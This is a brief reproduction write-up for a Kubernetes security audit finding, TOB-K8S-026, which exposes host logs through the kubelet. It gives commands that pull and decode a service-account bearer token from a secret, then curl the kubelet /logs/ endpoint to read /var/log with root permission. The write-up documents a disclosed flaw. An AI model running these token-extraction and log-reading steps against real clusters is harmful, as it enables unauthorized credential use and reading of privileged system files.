Source:
https://github.com/kubernetes/community/blob/master/wg-security-audit/findings/Kubernetes%20Final%20Report.pdf

# kubernetes-TOB-K8S-026
Directory traversal of host logs running kube-apiserver and kubelet

```
AWS_PROFILE=testing kubectl get secret
NAME                  TYPE                                  DATA      AGE
<token-name>  kubernetes.io/service-account-token   X         XXXd
```
```
AWS_PROFILE=testing kubectl get secret <token-name> -o json | jq -Mr '.data.token' | base64 -d
```

The output from previous command is the Bearer token. Put it under $MY_TOKEN below. Go to your K8s Node

```
curl -k -H "Authorization: Bearer $MY_TOKEN" "https://<node-ip>:10250/logs/"
```

And you should see /var/log with it subdirectories on the kubelet. You can enter directories and read with permission of root.
